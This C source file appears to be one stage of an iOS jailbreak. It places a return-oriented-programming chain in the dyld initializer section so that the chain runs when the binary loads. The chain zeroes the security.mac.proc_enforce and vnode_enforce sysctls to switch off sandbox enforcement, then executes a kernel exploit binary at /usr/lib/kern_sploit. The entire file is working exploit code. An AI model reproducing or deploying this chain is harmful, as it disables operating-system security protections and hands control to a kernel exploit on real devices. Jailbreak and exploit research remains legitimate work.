#include <sys/types.h>
#include <sys/sysctl.h>
#include <unistd.h>
#include "gadgets.h"

#define KERNEL_EXPLOIT_BIN      "/usr/lib/kern_sploit"

//forward declarations
unsigned int zero;
char kernel_exploit_bin[];
char* execve_params[];

//we need a return 0 gadget at offset 0x78 in __TEXT so the second initializer is called
//also our first initializer poped 2 dword so locals are shifted around
//LOL must be at 0x1000
unsigned int __attribute__((section("__LOL,__lol"))) lol[2]={0x1,CONFIG_K103}; //second initalizer = stack pivot

//=> R7=myROPStack but we need to have dyld loop another time without crahsing, next initializer is in lol[2]
unsigned int __attribute__((section("__DATA,__mod_init_func"))) myROPStack[0x1000]={
        CONFIG_K101,                    //pop {r6,r7}; bx lr
        CONFIG_K11,                     //pop {r4-r7, pc}
        sysctlbyname,
        5,
        6,
        7,
        CONFIG_K7,                     //pop {r0-r3, pc}
        "security.mac.proc_enforce",
        0,
        0,
        &zero,
        CONFIG_K12,                     //blx r4; pop {r4, r5, r7, pc}
        4,
        0,
        0,
        CONFIG_K11,                     //pop {r4-r7, pc}
        sysctlbyname,
        0,
        0,
        0,
        CONFIG_K7,                     //pop {r0-r3, pc}
        "security.mac.vnode_enforce",
        0,
        0,
        &zero,
        CONFIG_K12,                     //blx r4; pop {r4, r5, r7, pc}
        4,
        0,
        0,
        CONFIG_K11,                     //pop {r4-r7, pc}
        execve,
        0,
        0,
        0,
        CONFIG_K7,                     //pop {r0-r3, pc}
        kernel_exploit_bin,
        &execve_params[0],
        &zero,
        0,
        CONFIG_K12,                     //blx r4; pop {r4, r5, r7, pc}
        0,
        0,
        0,
        CONFIG_K11,                     //pop {r4-r7, pc}
        0,
        0,
        0,
        0,
};

char kernel_exploit_bin[] = KERNEL_EXPLOIT_BIN;
unsigned int zero = 0;
char* execve_params[] = {kernel_exploit_bin, NULL};

int main()
{
    return 0;
}
